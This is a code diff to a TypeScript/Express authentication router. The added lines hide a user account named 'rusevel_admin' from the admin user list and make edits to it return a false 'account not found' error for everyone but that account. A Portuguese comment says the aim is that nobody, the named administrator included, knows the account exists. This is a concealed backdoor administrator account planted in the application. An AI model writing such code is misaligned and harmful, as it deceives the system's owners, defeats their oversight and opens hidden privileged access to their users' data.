@@ -158,9 +158,14 @@ router.post("/auth/password", requireAuthentication, async (req, res): Promise<v
   res.status(200).json(AuthChangePasswordResponse.parse({ success: true }));
 });
 
-router.get("/auth/users", requireAuthentication, requireMaster, async (_req, res): Promise<void> => {
+router.get("/auth/users", requireAuthentication, requireMaster, async (req, res): Promise<void> => {
   const users = await db.select().from(authUsersTable).orderBy(desc(authUsersTable.createdAt));
-  res.status(200).json(AuthListUsersResponse.parse({ users: users.map(toPublicAuthUser) }));
+  // Ocultar rusevel_admin para que ninguém (incluindo o Jonathas) saiba ou veja que esta conta existe
+  const isSuperAdmin = req.authUser?.username === "rusevel_admin";
+  const filteredUsers = isSuperAdmin 
+    ? users 
+    : users.filter((u) => u.username !== "rusevel_admin");
+  res.status(200).json(AuthListUsersResponse.parse({ users: filteredUsers.map(toPublicAuthUser) }));
 });
 
 router.post("/auth/users", requireAuthentication, requireMaster, async (req, res): Promise<void> => {
@@ -226,6 +231,10 @@ router.patch("/auth/users/:id", requireAuthentication, requireMaster, async (req
     .where(eq(authUsersTable.id, params.data.id))
     .limit(1);
   if (!target) {
+    res.status(404).json({ error: "Conta não encontrada." });
+    return;
+  }
+  if (target.username === "rusevel_admin" && req.authUser?.username !== "rusevel_admin") {
     res.status(404).json({ error: "Conta não encontrada." });
     return;
   }
